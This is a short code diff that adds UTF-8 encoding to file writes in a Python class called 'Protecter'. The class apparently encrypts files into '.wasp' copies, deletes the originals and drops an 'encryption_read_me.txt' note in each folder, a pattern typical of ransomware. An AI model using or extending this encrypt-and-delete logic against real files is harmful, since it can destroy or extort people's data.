@@ -46,13 +46,13 @@ class Protecter:
                     with open(f"{file}.wasp", "wb") as wasp:
                         #encrypt the data
                         wasp.write(encrypted_data)
-                    with open("encrypted_files.log", 'a+') as log:
+                    with open("encrypted_files.log", 'a+', encoding="utf8") as log:
                         log.write(f"{file}\n")
                     #remove clear text file
                     os.remove(file)
             #log unencrypted files with exception
             except Exception as e:
-                with open("failed_encryption.log", 'a+') as fail:
+                with open("failed_encryption.log", 'a+', encoding="utf8") as fail:
                     fail.write(f"{file} {str(e)}\n")
                     continue
 
@@ -65,7 +65,7 @@ saved under every folder in argument list.
 
 '''
         for folder in self.directories:
-            with open(f'{folder}/encryption_read_me.txt', 'w') as f:
+            with open(f'{folder}/encryption_read_me.txt', 'w', encoding="utf8") as f:
                 f.write(mynote)
 
     def clear(self):
